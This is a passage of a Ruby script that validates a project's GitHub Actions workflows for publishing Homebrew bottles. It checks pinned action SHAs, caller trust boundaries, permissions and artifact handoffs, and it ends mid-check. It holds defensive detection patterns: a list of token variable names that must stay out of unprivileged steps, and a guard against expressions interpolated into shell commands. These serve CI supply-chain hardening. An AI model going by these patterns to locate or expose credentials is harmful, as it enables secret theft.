#!/usr/bin/env ruby
# frozen_string_literal: true

require "digest"
require "json"
require "yaml"

REPO_ROOT = File.expand_path("..", __dir__)
PUBLISHER_PATH = File.join(REPO_ROOT, ".github/workflows/reusable-homebrew-bottle-publish.yml")
MAINTENANCE_PATH = File.join(REPO_ROOT, ".github/workflows/reusable-homebrew-bottle-maintenance.yml")
TAP_CALLER_ROOT = File.join(REPO_ROOT, "homebrew/kandelo-homebrew/.github/workflows")
CHECKOUT_ACTION = "actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd"
NIX_ACTION = "DeterminateSystems/nix-installer-action@ef8a148080ab6020fd15196c2084a2eea5ff2d25"
MAGIC_NIX_ACTION = "DeterminateSystems/magic-nix-cache-action@908b263ff629f4cc17666315b7fd3ec127c6244d"
UPLOAD_ACTION = "actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a"
DOWNLOAD_ACTION = "actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c"
BREW_COMMIT = "34c40c18ffa2029b611b61c73273e32c003d0842"
PUBLISHER_PLAN_DIGEST = "75468bd935146ca1c78e1a757a314bb6355bce63f01707c3345936d3f9ccaf07"
PUBLISHER_BUILD_DIGEST = "682e73ef771a9beebb0bbfaea2770d6f1cd7062882b4bb3145958d204e1436b5"
PUBLISHER_UPLOAD_DIGEST = "329ff7dfafc8f3c262ae8c817187d875db451da05d7d98a12eafda45cdbf2213"
PUBLISHER_INDEX_DIGEST = "2c5988c9b840dcc1e845f40b58e47ed8263a9babccdae08140bea145a4199de3"
PUBLISHER_VERIFY_DIGEST = "73cc22e389c4fb449f32976860178dc40bce686739c6662cb769ca2ad93b7003"
PUBLISHER_FINALIZE_DIGEST = "2e7a24cdcaa63e631cee1a967bff1c41bb0f8f8e57e2039929efda5d069cf9f9"
MAINTENANCE_VALIDATE_DIGEST = "9ab856fe40640172500d82b5179a096aa028763bf696aeac865d732298617a22"
MAINTENANCE_ROLLBACK_DIGEST = "45ff220697da9604dbe69c82761f285ba2e3e5182ef0819360128b82dd169efc"

def check(condition, message)
  raise message unless condition
end

def load_workflow(path)
  workflow = YAML.safe_load_file(path, aliases: false)
  check(workflow.is_a?(Hash), "#{File.basename(path)} is not a workflow mapping")
  workflow
end

def workflow_events(workflow)
  events = workflow.key?("on") ? workflow["on"] : workflow[true]
  check(events.is_a?(Hash), "workflow on: value is not a mapping")
  events
end

def values_for_key(node, wanted, values = [])
  case node
  when Hash
    node.each do |key, value|
      values << value if key.to_s == wanted
      values_for_key(value, wanted, values)
    end
  when Array
    node.each { |value| values_for_key(value, wanted, values) }
  end
  values
end

def deep_copy(value)
  Marshal.load(Marshal.dump(value))
end

def canonical_contract(value)
  case value
  when Hash
    value.keys.sort_by(&:to_s).to_h do |key|
      [key.to_s, canonical_contract(value.fetch(key))]
    end
  when Array
    value.map { |entry| canonical_contract(entry) }
  else
    value
  end
end

def contract_digest(value)
  Digest::SHA256.hexdigest(JSON.generate(canonical_contract(value)))
end

def workflow_jobs(workflow)
  jobs = workflow["jobs"]
  check(jobs.is_a?(Hash), "workflow jobs: value is not a mapping")
  jobs
end

def job_steps(job, label)
  steps = job["steps"]
  check(steps.is_a?(Array), "#{label} steps: value is not an array")
  check(steps.all? { |step| step.is_a?(Hash) }, "#{label} contains a non-mapping step")
  steps
end

def named_step(steps, name)
  matches = steps.select { |step| step["name"] == name }
  check(matches.length == 1, "expected exactly one #{name.inspect} step")
  matches.first
end

def check_architecture_aware_sysroot_step(step, label)
  check(step.keys.sort == %w[env name run shell] && step["shell"] == "bash" &&
        step["env"] == { "KANDELO_HOMEBREW_ARCH" => "${{ matrix.arch }}" },
        "#{label} sysroot mapping changed")
  run = step.fetch("run")
  check(run.lines.count { |line| line.strip ==
        "bash scripts/dev-shell.sh bash scripts/build-musl.sh" } == 1,
        "#{label} does not build the invariant wasm32 base sysroot exactly once")
  check(run.lines.count { |line| line.strip ==
        "bash scripts/dev-shell.sh bash scripts/build-musl.sh --arch wasm64posix" } == 1,
        "#{label} does not build the wasm64 target sysroot exactly once")
  [
    'case "$KANDELO_HOMEBREW_ARCH" in', "wasm32) ;;", "wasm64)",
    "unsupported Kandelo Homebrew architecture", "exit 2",
  ].each do |fragment|
    check(run.include?(fragment), "#{label} architecture selection lacks #{fragment}")
  end
end

def check_sidecar_sysroot_binding(source, fingerprint_source)
  [
    'BUILD_ROOT="${KANDELO_HOMEBREW_BUILD_ROOT:-$KANDELO_ROOT}"',
    'SYSROOT_FINGERPRINT="$(bash "$KANDELO_ROOT/scripts/homebrew-sysroot-fingerprint.sh"',
    '--kandelo-root "$BUILD_ROOT" --arch "$KANDELO_HOMEBREW_ARCH")"',
    'BUILD_COMMIT="$(git -C "$BUILD_ROOT" rev-parse HEAD)"',
    'if [ "$BUILD_COMMIT" != "$KANDELO_COMMIT" ]; then',
  ].each do |fragment|
    check(source.include?(fragment), "sidecar target-sysroot binding lacks #{fragment}")
  end
  check(source.scan("SYSROOT_FINGERPRINT=").length == 1,
        "sidecar generator has more than one sysroot fingerprint source")
  [
    'wasm32) SYSROOT_LIBC="$KANDELO_ROOT/sysroot/lib/libc.a" ;;',
    'wasm64) SYSROOT_LIBC="$KANDELO_ROOT/sysroot64/lib/libc.a" ;;',
    '[ ! -f "$SYSROOT_LIBC" ] || [ -L "$SYSROOT_LIBC" ]',
    'selected $ARCH sysroot libc must be a regular non-symlink file',
    'sha256sum "$SYSROOT_LIBC"', 'shasum -a 256 "$SYSROOT_LIBC"',
  ].each do |fragment|
    check(fingerprint_source.include?(fragment),
          "sidecar sysroot fingerprint helper lacks #{fragment}")
  end
end

def check_forbidden_root_args(run, label, expected)
  actual = run.lines.filter_map do |line|
    stripped = line.strip.delete_suffix(" \\")
    stripped if stripped.start_with?("--forbidden-root ")
  end
  check(actual == expected, "#{label} forbidden-root trust mapping changed")
end

def exact_permissions?(actual, expected)
  actual.is_a?(Hash) && actual.transform_keys(&:to_s) == expected
end

def check_common(workflow, label)
  mutable_actions = values_for_key(workflow, "uses").select do |value|
    value.is_a?(String) && !value.start_with?("./") &&
      !value.match?(%r{\A[^@\s]+@[0-9a-f]{40}\z})
  end
  check(mutable_actions.empty?,
        "#{label} executes mutable action refs: #{mutable_actions.join(', ')}")

  cache_uses = values_for_key(workflow, "uses").select do |value|
    value.is_a?(String) && value.downcase.match?(%r{\Aactions/cache(?:/restore)?@})
  end
  check(cache_uses.empty?, "#{label} consumes Actions cache state: #{cache_uses.join(', ')}")

  unsafe_runs = values_for_key(workflow, "run").select do |value|
    value.is_a?(String) && value.include?("${{")
  end
  check(unsafe_runs.empty?, "#{label} interpolates a GitHub expression into shell syntax")
  check(values_for_key(workflow, "secrets").empty?, "#{label} passes repository secrets")
end

def check_tap_caller(path, expected_name:, event_type:, job_name:, reusable:, inputs:)
  workflow = load_workflow(path)
  top_keys = workflow.keys.map { |key| key == true ? "on" : key.to_s }.sort
  check(top_keys == %w[jobs name on], "#{File.basename(path)} has unexpected top-level configuration")
  check(workflow["name"] == expected_name, "#{File.basename(path)} name changed")
  check(workflow_events(workflow) == {
    "repository_dispatch" => { "types" => [event_type] },
  }, "#{File.basename(path)} must expose only its reviewed repository_dispatch event")
  jobs = workflow_jobs(workflow)
  check(jobs.keys == [job_name], "#{File.basename(path)} has an unexpected job set")
  job = jobs.fetch(job_name)
  check(job.keys.sort == %w[permissions uses with], "#{File.basename(path)} caller job changed")
  check(exact_permissions?(job["permissions"], {
    "actions" => "read", "contents" => "write", "packages" => "write",
  }), "#{File.basename(path)} permission ceiling changed")
  check(job["uses"] == reusable, "#{File.basename(path)} reusable workflow target changed")
  check(job["with"] == inputs, "#{File.basename(path)} caller inputs changed")
  check(values_for_key(workflow, "run").empty? && values_for_key(workflow, "steps").empty?,
        "#{File.basename(path)} may not execute caller-local steps")
  check(values_for_key(workflow, "secrets").empty?,
        "#{File.basename(path)} may not inherit or pass secrets")
end

def check_tap_callers
  publish_inputs = {
    "kandelo-repository" => "Automattic/kandelo",
    "kandelo-ref" => "main",
    "tap-repository" => "Automattic/kandelo-homebrew",
    "tap-ref" => "main",
    "formulae" => "${{ github.event.client_payload.formulae }}",
    "arches" => "${{ github.event.client_payload.arches || 'wasm32' }}",
    "release-tag" => "${{ github.event.client_payload.release_tag || '' }}",
    "expected-cache-keys" => "${{ github.event.client_payload.expected_cache_keys || '' }}",
    "force" => "${{ github.event.client_payload.force || false }}",
    "dry-run" => false,
  }
  check_tap_caller(
    File.join(TAP_CALLER_ROOT, "publish-bottles.yml"),
    expected_name: "Publish Kandelo bottles",
    event_type: "publish-kandelo-bottles",
    job_name: "publish",
    reusable: "Automattic/kandelo/.github/workflows/reusable-homebrew-bottle-publish.yml@main",
    inputs: publish_inputs,
  )

  check_tap_caller(
    File.join(TAP_CALLER_ROOT, "dry-run-bottles.yml"),
    expected_name: "Dry run Kandelo bottles",
    event_type: "dry-run-kandelo-bottles",
    job_name: "dry-run",
    reusable: "Automattic/kandelo/.github/workflows/reusable-homebrew-bottle-publish.yml@main",
    inputs: publish_inputs.merge({
      "kandelo-repository" => "${{ github.event.client_payload.kandelo_repository || 'Automattic/kandelo' }}",
      "kandelo-ref" => "${{ github.event.client_payload.kandelo_ref || 'main' }}",
      "tap-repository" => "${{ github.event.client_payload.tap_repository || 'Automattic/kandelo-homebrew' }}",
      "tap-ref" => "${{ github.event.client_payload.tap_ref || 'main' }}",
      "dry-run" => true,
    }),
  )

  check_tap_caller(
    File.join(TAP_CALLER_ROOT, "maintain-bottles.yml"),
    expected_name: "Maintain Kandelo bottles",
    event_type: "maintain-kandelo-bottles",
    job_name: "maintain",
    reusable: "Automattic/kandelo/.github/workflows/reusable-homebrew-bottle-maintenance.yml@main",
    inputs: {
      "mode" => "${{ github.event.client_payload.mode || 'rebuild' }}",
      "formulae" => "${{ github.event.client_payload.formulae }}",
      "arches" => "${{ github.event.client_payload.arches || 'wasm32' }}",
      "release-tag" => "${{ github.event.client_payload.release_tag || '' }}",
      "expected-cache-keys" => "${{ github.event.client_payload.expected_cache_keys || '' }}",
      "force" => "${{ github.event.client_payload.force || false }}",
      "rollback-reason" => "${{ github.event.client_payload.rollback_reason || '' }}",
      "rollback-ref" => "${{ github.event.client_payload.rollback_ref || '' }}",
      "deleted-package-url" => "${{ github.event.client_payload.deleted_package_url || '' }}",
      "deletion-reason" => "${{ github.event.client_payload.deletion_reason || '' }}",
    },
  )
end

def check_publisher(workflow)
  top_keys = workflow.keys.map { |key| key == true ? "on" : key.to_s }.sort
  check(top_keys == %w[jobs name on],
        "publisher has unexpected top-level configuration")
  check(workflow["name"] == "Reusable Kandelo Homebrew bottle publish",
        "publisher name changed")

  events = workflow_events(workflow)
  check(events.keys == ["workflow_call"], "publisher must only expose workflow_call")
  workflow_call = events.fetch("workflow_call")
  check(workflow_call.keys == ["inputs"], "publisher workflow_call contract changed")
  check(workflow_call["inputs"] == {
    "kandelo-repository" => { "type" => "string", "default" => "Automattic/kandelo" },
    "kandelo-ref" => { "type" => "string", "default" => "main" },
    "tap-repository" => { "type" => "string", "default" => "Automattic/kandelo-homebrew" },
    "tap-ref" => { "type" => "string", "default" => "main" },
    "formulae" => { "type" => "string", "required" => true },
    "arches" => { "type" => "string", "default" => "wasm32" },
    "release-tag" => { "type" => "string", "default" => "" },
    "bottle-root-url" => { "type" => "string", "default" => "" },
    "expected-cache-keys" => { "type" => "string", "default" => "" },
    "force" => { "type" => "boolean", "default" => false },
    "dry-run" => { "type" => "boolean", "default" => false },
  }, "publisher inputs changed")
  check(!workflow.key?("permissions"), "publisher requests workflow-wide permissions")
  check_common(workflow, "reusable publisher")

  jobs = workflow_jobs(workflow)
  check(jobs.keys.sort == %w[build-and-test finalize-tap plan publish-bottle-index upload-bottle verify-bottle],
        "publisher has an unexpected job set")
  plan = jobs.fetch("plan")
  build = jobs.fetch("build-and-test")
  upload = jobs.fetch("upload-bottle")
  index = jobs.fetch("publish-bottle-index")
  verify = jobs.fetch("verify-bottle")
  finalize = jobs.fetch("finalize-tap")

  check(plan.keys.sort == %w[outputs permissions runs-on steps],
        "publisher plan contract changed")
  %w[build-and-test upload-bottle verify-bottle finalize-tap].each do |job_name|
    check(jobs.fetch(job_name).keys.sort ==
          %w[if needs permissions runs-on steps strategy timeout-minutes],
          "publisher #{job_name} job contract changed")
  end
  check(index.keys.sort == %w[concurrency if needs permissions runs-on steps strategy timeout-minutes],
        "publisher version-index job contract changed")
  check(plan["runs-on"] == "ubuntu-latest" &&
        exact_permissions?(plan["permissions"], { "contents" => "read" }),
        "publisher plan authority changed")
  check(build["runs-on"] == "ubuntu-latest" && build["timeout-minutes"] == 1440 &&
        exact_permissions?(build["permissions"], { "contents" => "read", "actions" => "read" }),
        "publisher build authority changed")
  check(upload["runs-on"] == "ubuntu-latest" && upload["timeout-minutes"] == 60 &&
        exact_permissions?(upload["permissions"], {
          "actions" => "read", "contents" => "read", "packages" => "write",
        }), "publisher uploader authority changed")
  check(index["runs-on"] == "ubuntu-latest" && index["timeout-minutes"] == 60 &&
        exact_permissions?(index["permissions"], {
          "actions" => "read", "contents" => "read", "packages" => "write",
        }) && index["concurrency"] == {
          "group" => "kandelo-homebrew-bottle-index-${{ inputs.tap-repository }}-${{ matrix.formula }}",
          "cancel-in-progress" => false,
        }, "publisher version-index authority or concurrency changed")
  check(verify["runs-on"] == "ubuntu-latest" && verify["timeout-minutes"] == 1440 &&
        exact_permissions?(verify["permissions"], { "actions" => "read", "contents" => "read" }),
        "publisher verifier authority changed")
  check(finalize["runs-on"] == "ubuntu-latest" && finalize["timeout-minutes"] == 120 &&
        exact_permissions?(finalize["permissions"], { "actions" => "read", "contents" => "write" }),
        "publisher finalizer authority changed")

  matrix_strategy = {
    "fail-fast" => false,
    "matrix" => { "include" => "${{ fromJson(needs.plan.outputs.matrix) }}" },
  }
  [build, upload, verify, finalize].each do |job|
    check(job["strategy"] == matrix_strategy,
          "publisher execution job bypasses the validated matrix")
  end
  check(index["strategy"] == {
    "fail-fast" => false,
    "matrix" => { "include" => "${{ fromJson(needs.plan.outputs.formula-matrix) }}" },
  }, "publisher version-index job bypasses the validated Formula matrix")
  check(build["needs"] == ["plan"] &&
        build["if"] == "${{ needs.plan.outputs.matrix != '[]' }}",
        "publisher build graph changed")
  check(upload["needs"] == %w[plan build-and-test] &&
        upload["if"] == "${{ always() && !cancelled() && !inputs.dry-run && " \
                         "needs.plan.result == 'success' && needs.plan.outputs.matrix != '[]' }}",
        "publisher upload graph or dry-run isolation changed")
  check(index["needs"] == %w[plan build-and-test upload-bottle] &&
        index["if"] == "${{ always() && !cancelled() && !inputs.dry-run && needs.plan.result == 'success' && " \
                        "needs.build-and-test.result == 'success' && needs.upload-bottle.result == 'success' && " \
                        "needs.plan.outputs.matrix != '[]' }}",
        "publisher version-index graph or dry-run isolation changed")
  check(verify["needs"] == %w[plan build-and-test upload-bottle publish-bottle-index] &&
        verify["if"] == "${{ always() && !cancelled() && needs.plan.result == 'success' && " \
                         "needs.build-and-test.result == 'success' && (inputs.dry-run || " \
                         "(needs.upload-bottle.result == 'success' && needs.publish-bottle-index.result == 'success')) && " \
                         "needs.plan.outputs.matrix != '[]' }}",
        "publisher verification graph changed")
  check(finalize["needs"] == %w[plan build-and-test upload-bottle verify-bottle] &&
        finalize["if"] == "${{ always() && !cancelled() && !inputs.dry-run && " \
                           "needs.plan.result == 'success' && needs.plan.outputs.matrix != '[]' }}",
        "publisher finalization graph or dry-run isolation changed")

  plan_steps = job_steps(plan, "publisher plan")
  build_steps = job_steps(build, "publisher build")
  upload_steps = job_steps(upload, "publisher upload")
  index_steps = job_steps(index, "publisher version index")
  verify_steps = job_steps(verify, "publisher verification")
  finalize_steps = job_steps(finalize, "publisher finalization")

  validation = named_step(plan_steps, "Validate caller trust boundary")
  check(plan_steps.first.equal?(validation), "publisher trust validation must be first")
  check(validation.keys.sort == %w[env name run shell] && validation["shell"] == "bash" &&
        validation["env"] == {
          "CALLER_EVENT_NAME" => "${{ github.event_name }}",
          "CALLER_REF" => "${{ github.ref }}",
          "CALLER_REPOSITORY" => "${{ github.repository }}",
          "CALLER_WORKFLOW_REF" => "${{ github.workflow_ref }}",
          "DRY_RUN" => "${{ inputs.dry-run }}",
          "KANDELO_REPOSITORY" => "${{ inputs.kandelo-repository }}",
          "KANDELO_REF" => "${{ inputs.kandelo-ref }}",
          "TAP_REPOSITORY" => "${{ inputs.tap-repository }}",
          "TAP_REF" => "${{ inputs.tap-ref }}",
          "BOTTLE_ROOT_URL" => "${{ inputs.bottle-root-url }}",
        }, "publisher caller validation mapping changed")
  validation_run = validation.fetch("run")
  [
    '[ "$CALLER_REPOSITORY" = "Automattic/kandelo-homebrew" ]',
    '[ "$CALLER_REF" = "refs/heads/main" ]',
    '[ "$CALLER_EVENT_NAME" = "repository_dispatch" ]',
    "dry-run-bottles.yml@refs/heads/main",
    "publish-bottles.yml@refs/heads/main",
    "maintain-bottles.yml@refs/heads/main",
    '[ "$KANDELO_REPOSITORY" = "Automattic/kandelo" ]',
    '[ "$KANDELO_REF" = "main" ]',
    '[ "$TAP_REPOSITORY" = "Automattic/kandelo-homebrew" ]',
    '[ "$TAP_REF" = "main" ]',
    '[ -z "$BOTTLE_ROOT_URL" ]',
  ].each do |predicate|
    check(validation_run.include?(predicate), "publisher caller validation lacks #{predicate}")
  end
  dry_index = validation_run.index('if [ "$DRY_RUN" = "true" ]')
  caller_index = validation_run.index('[ "$CALLER_REF" = "refs/heads/main" ]')
  check(dry_index && caller_index && caller_index < dry_index,
        "publisher dry-run can bypass caller authority validation")

  release_run = named_step(plan_steps, "Resolve release and bottle root").fetch("run")
  check(release_run.include?('expected_release_tag="bottles-abi-v${abi}"') &&
        release_run.include?('[ "$release_tag" != "$expected_release_tag" ]'),
        "publisher does not bind release tag exactly to the resolved ABI")
  planner_source = File.read(File.join(REPO_ROOT, "scripts/homebrew-plan-matrix.sh"))
  check(planner_source.include?("formula selection must not be empty") &&
        planner_source.include?("architecture selection must not be empty"),
        "publisher planner permits a green empty dispatch")
  check(plan["outputs"] == {
    "matrix" => "${{ steps.matrix.outputs.matrix }}",
    "formula-matrix" => "${{ steps.matrix.outputs.formula-matrix }}",
    "abi" => "${{ steps.release.outputs.abi }}",
    "release-tag" => "${{ steps.release.outputs.release-tag }}",
    "bottle-root-prefix" => "${{ steps.release.outputs.bottle-root-prefix }}",
    "kandelo-sha" => "${{ steps.source-commits.outputs.kandelo-sha }}",
    "tap-sha" => "${{ steps.source-commits.outputs.tap-sha }}",
  }, "publisher plan outputs changed")

  expected_uses = [
    *Array.new(18, CHECKOUT_ACTION),
    *Array.new(5, NIX_ACTION),
    *Array.new(2, MAGIC_NIX_ACTION),
    *Array.new(7, UPLOAD_ACTION),
    *Array.new(9, DOWNLOAD_ACTION),
  ].sort
  check(values_for_key(workflow, "uses").sort == expected_uses,
        "publisher action set or pin changed")

  checkout_view = lambda do |steps|
    steps.select { |step| step["uses"] == CHECKOUT_ACTION }.map do |step|
      { "name" => step["name"], "if" => step["if"], "with" => step["with"] }
    end
  end
  check(checkout_view.call(plan_steps) == [
    {
      "name" => "Checkout Kandelo workflow source", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.kandelo-repository }}",
        "ref" => "${{ inputs.kandelo-ref }}", "path" => "kandelo", "submodules" => false,
      },
    },
    {
      "name" => "Checkout tap", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.tap-repository }}",
        "ref" => "${{ inputs.tap-ref }}", "path" => "tap",
      },
    },
  ], "publisher plan checkout wiring changed")
  check(checkout_view.call(build_steps) == [
    {
      "name" => "Checkout Kandelo workflow source", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.kandelo-repository }}",
        "ref" => "${{ needs.plan.outputs.kandelo-sha }}",
        "path" => "kandelo", "submodules" => false,
      },
    },
    {
      "name" => "Checkout tap", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.tap-repository }}",
        "ref" => "${{ needs.plan.outputs.tap-sha }}", "path" => "tap",
      },
    },
    {
      "name" => "Checkout reviewed Homebrew implementation", "if" => nil,
      "with" => {
        "persist-credentials" => false, "repository" => "Homebrew/brew",
        "ref" => BREW_COMMIT, "path" => "homebrew-prefix/Homebrew",
      },
    },
    {
      "name" => "Checkout exact post-build Kandelo validator source", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.kandelo-repository }}",
        "ref" => "${{ needs.plan.outputs.kandelo-sha }}",
        "path" => "kandelo-postbuild", "submodules" => false,
      },
    },
    {
      "name" => "Checkout exact post-build tap source", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.tap-repository }}",
        "ref" => "${{ needs.plan.outputs.tap-sha }}", "path" => "tap-reviewed",
      },
    },
  ], "publisher build checkout wiring changed")
  check(checkout_view.call(upload_steps) == [
    {
      "name" => "Checkout exact Kandelo validator source", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.kandelo-repository }}",
        "ref" => "${{ needs.plan.outputs.kandelo-sha }}",
        "path" => "kandelo", "submodules" => false,
      },
    },
  ], "publisher uploader checkout wiring changed")
  check(checkout_view.call(index_steps) == [
    {
      "name" => "Checkout exact Kandelo index publisher source", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.kandelo-repository }}",
        "ref" => "${{ needs.plan.outputs.kandelo-sha }}",
        "path" => "kandelo", "submodules" => false,
      },
    },
  ], "publisher version-index checkout wiring changed")
  check(checkout_view.call(verify_steps) == [
    {
      "name" => "Checkout exact Kandelo verifier source", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.kandelo-repository }}",
        "ref" => "${{ needs.plan.outputs.kandelo-sha }}",
        "path" => "kandelo", "submodules" => false,
      },
    },
    {
      "name" => "Checkout exact tap source", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.tap-repository }}",
        "ref" => "${{ needs.plan.outputs.tap-sha }}", "path" => "tap",
      },
    },
    {
      "name" => "Checkout reviewed Homebrew implementation for bottle verification", "if" => nil,
      "with" => {
        "persist-credentials" => false, "repository" => "Homebrew/brew",
        "ref" => BREW_COMMIT, "path" => "homebrew-prefix/Homebrew",
      },
    },
    {
      "name" => "Checkout exact post-verification Kandelo generator source", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.kandelo-repository }}",
        "ref" => "${{ needs.plan.outputs.kandelo-sha }}",
        "path" => "kandelo-postverify", "submodules" => false,
      },
    },
    {
      "name" => "Checkout exact post-verification tap source", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.tap-repository }}",
        "ref" => "${{ needs.plan.outputs.tap-sha }}", "path" => "tap-postverify",
      },
    },
  ], "publisher verifier checkout wiring changed")

  failure_condition = "${{ always() && (steps.publish-handoff.outcome != 'success' || " \
                      "steps.validate-payload.outcome != 'success' || steps.publish.outcome != 'success') }}"
  check(checkout_view.call(finalize_steps) == [
    {
      "name" => "Checkout exact Kandelo finalizer source", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.kandelo-repository }}",
        "ref" => "${{ needs.plan.outputs.kandelo-sha }}",
        "path" => "kandelo", "submodules" => false,
      },
    },
    {
      "name" => "Checkout exact base tap without credentials", "if" => nil,
      "with" => {
        "persist-credentials" => false,
        "repository" => "${{ inputs.tap-repository }}",
        "ref" => "${{ needs.plan.outputs.tap-sha }}", "path" => "tap-base",
      },
    },
    {
      "name" => "Checkout tap publication branch after payload validation",
      "if" => "${{ steps.validate-payload.outcome == 'success' }}",
      "with" => {
        "repository" => "${{ inputs.tap-repository }}", "ref" => "main",
        "path" => "tap-publish", "fetch-depth" => 0,
      },
    },
    {
      "name" => "Checkout clean tap for a failed-attempt report", "if" => failure_condition,
      "with" => {
        "repository" => "${{ inputs.tap-repository }}", "ref" => "main",
        "path" => "tap-report", "fetch-depth" => 0,
      },
    },
  ], "publisher finalizer checkout wiring changed")

  credential_names = %w[
    GH_TOKEN GITHUB_TOKEN HOMEBREW_GITHUB_API_TOKEN HOMEBREW_GITHUB_PACKAGES_TOKEN
    HOMEBREW_DOCKER_REGISTRY_TOKEN
  ]
  [build_steps, verify_steps].each do |steps|
    exposed = steps.flat_map { |step| step.fetch("env", {}).keys & credential_names }
    check(exposed.empty?, "unprivileged publisher phase exposes a credential environment")
    check(steps.select { |step| step["uses"] == CHECKOUT_ACTION }.all? do |step|
      step.dig("with", "persist-credentials") == false
    end, "unprivileged publisher phase persists checkout credentials")
  end
  uploader_credential_steps = upload_steps.select do |step|
    !(step.fetch("env", {}).keys & credential_names).empty?
  end
  check(uploader_credential_steps.map { |step| step["name"] } ==
        ["Upload validated bottle in isolated ORAS auth state"] &&
        uploader_credential_steps.first["env"] == {
          "GH_TOKEN" => "${{ github.token }}",
          "KANDELO_HOMEBREW_FORMULA" => "${{ matrix.formula }}",
          "KANDELO_HOMEBREW_TAP_REPOSITORY" => "${{ inputs.tap-repository }}",
        },
        "publisher uploader credentials escape the isolated upload step")
  index_credential_steps = index_steps.select do |step|
    !(step.fetch("env", {}).keys & credential_names).empty?
  end
  check(index_credential_steps.map { |step| step["name"] } ==
        ["Publish the complete Homebrew version index in isolated ORAS auth state"] &&
        index_credential_steps.first["env"] == {
          "GH_TOKEN" => "${{ github.token }}",
          "KANDELO_HOMEBREW_FORMULA" => "${{ matrix.formula }}",
          "KANDELO_HOMEBREW_TAP_REPOSITORY" => "${{ inputs.tap-repository }}",
        },
        "publisher version-index credentials escape the isolated transport step")
  finalizer_credential_steps = finalize_steps.select do |step|
    !(step.fetch("env", {}).keys & credential_names).empty?
  end
  check(finalizer_credential_steps.map { |step| step["name"] } == [
    "Publish validated sidecars under the tap state lock",
    "Record failed attempt without replacing last-green metadata",
  ] && finalizer_credential_steps.all? do |step|
    step.fetch("env").slice(*credential_names) == { "GH_TOKEN" => "${{ github.token }}" }
  end, "publisher finalizer credentials escape tap write steps")

  build_handoff_name =
    "homebrew-build-handoff-${{ matrix.formula }}-${{ matrix.arch }}-attempt-${{ github.run_attempt }}"
  upload_receipt_name =
    "homebrew-upload-receipt-${{ matrix.formula }}-${{ matrix.arch }}-attempt-${{ github.run_attempt }}"
  publish_handoff_name =
    "homebrew-publish-handoff-${{ matrix.formula }}-${{ matrix.arch }}-attempt-${{ github.run_attempt }}"
  child_layout_name =
    "homebrew-oci-child-${{ matrix.formula }}-${{ matrix.arch }}-attempt-${{ github.run_attempt }}"
  index_publication_name =
    "homebrew-index-publication-${{ matrix.formula }}-attempt-${{ github.run_attempt }}"
  build_handoff_upload = named_step(build_steps, "Upload strict bottle build handoff")
  check(build_handoff_upload["uses"] == UPLOAD_ACTION && build_handoff_upload["with"] == {
    "name" => build_handoff_name,
    "path" => "${{ runner.temp }}/homebrew-build-handoff",
    "compression-level" => 0,
    "if-no-files-found" => "error", "retention-days" => 2,
  }, "publisher build handoff artifact contract changed")
  child_layout_upload = named_step(build_steps, "Upload deterministic Homebrew OCI child")
  check(child_layout_upload["uses"] == UPLOAD_ACTION && child_layout_upload["with"] == {
    "name" => child_layout_name,
    "path" => "${{ runner.temp }}/homebrew-oci-child",
    "compression-level" => 0,
    "if-no-files-found" => "error", "retention-days" => 2,
  }, "publisher OCI child artifact contract changed")
  upload_handoff_download = named_step(upload_steps, "Download strict build handoff")
  verify_handoff_download = named_step(verify_steps, "Download strict build handoff")
  [upload_handoff_download, verify_handoff_download].each do |step|
    check(step["uses"] == DOWNLOAD_ACTION && step["id"] == "build-handoff" &&
          step["continue-on-error"] == true && step["with"] == {
            "name" => build_handoff_name,
            "path" => "${{ runner.temp }}/homebrew-build-handoff",
          }, "publisher build handoff download contract changed")
  end
  upload_child_download = named_step(upload_steps, "Download deterministic Homebrew OCI child")
  verify_child_download = named_step(
    verify_steps, "Download deterministic Homebrew OCI child for dry-run validation"
  )
  [upload_child_download, verify_child_download].each do |step|
    check(step["uses"] == DOWNLOAD_ACTION && step["id"] == "oci-child" &&
          step["continue-on-error"] == true && step["with"] == {
            "name" => child_layout_name,
            "path" => "${{ runner.temp }}/homebrew-oci-child",
          }, "publisher OCI child download contract changed")
  end
  receipt_upload = named_step(upload_steps, "Upload strict upload receipt")
  check(receipt_upload["uses"] == UPLOAD_ACTION && receipt_upload["with"] == {
    "name" => upload_receipt_name,
    "path" => "${{ runner.temp }}/homebrew-upload-receipt/receipt.json",
    "if-no-files-found" => "error", "retention-days" => 2,
  }, "publisher upload receipt artifact contract changed")
  receipt_download = named_step(verify_steps, "Download strict upload receipt")
  check(receipt_download["uses"] == DOWNLOAD_ACTION && receipt_download["id"] == "upload-receipt" &&
        receipt_download["if"] == "${{ !inputs.dry-run }}" &&
        receipt_download["continue-on-error"] == true && receipt_download["with"] == {
          "name" => upload_receipt_name,
          "path" => "${{ runner.temp }}/homebrew-upload-receipt",
  }, "publisher receipt download contract changed")
  index_publication_upload = named_step(index_steps, "Upload public Homebrew version-index evidence")
  check(index_publication_upload["uses"] == UPLOAD_ACTION &&
        index_publication_upload["with"] == {
          "name" => index_publication_name,
          "path" => "${{ runner.temp }}/homebrew-complete-index/layout-receipt.json\n" \
                    "${{ runner.temp }}/homebrew-complete-index/transport-receipt.json\n",
          "compression-level" => 0,
          "if-no-files-found" => "error", "retention-days" => 2,
        }, "publisher version-index publication artifact contract changed")
  index_publication_download = named_step(
    verify_steps, "Download public Homebrew version-index evidence"
  )
  check(index_publication_download["uses"] == DOWNLOAD_ACTION &&
        index_publication_download["id"] == "index-publication" &&
